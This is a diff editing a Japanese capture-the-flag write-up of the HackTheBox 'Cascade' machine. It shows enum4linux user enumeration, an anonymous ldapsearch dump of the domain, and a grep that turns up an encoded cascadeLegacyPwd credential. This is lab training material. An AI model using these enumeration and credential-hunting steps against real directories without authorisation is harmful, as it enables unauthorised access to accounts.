@@ -21,7 +21,7 @@ user:[j.allen] rid:[0x46e]
 user:[i.croft] rid:[0x46f]
 ```
 
-この`enum4linux`の結果よりユーザリストを作る：
+この結果よりユーザリストを作る：
 
 ```
 ┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
@@ -47,8 +47,7 @@ i.croft
 ┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
 └─$ ldapsearch -x -H ldap://10.10.10.182 -b 'DC=cascade,DC=local' > ldapsearch-domain.txt
 ```
-一列目のdnとかsAMAccoufntTypeとかobjectClassの項目で、出現頻度が少ないものに着目しようと
-おもい、以下のように実行した（infoの欄にパスワードが書かれてたりすることがあるから）
+一列目のdnとかsAMAccoufntTypeとかobjectClassの項目で、出現頻度が少ないものに着目しようと思い、以下のように実行した（infoの欄にパスワードが書かれてたりすることがあるから）
 
 ```
 ┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
@@ -61,7 +60,11 @@ i.croft
       1 cascadeLegacyPwd
       1 dNSHostName
 ...
+```
 
+怪しい"cascadeLegacyPwd"という項目を発見。
+
+```
 ┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
 └─$ grep LegacyPwd ldapsearch-domain.txt
 cascadeLegacyPwd: clk0bjVldmE=
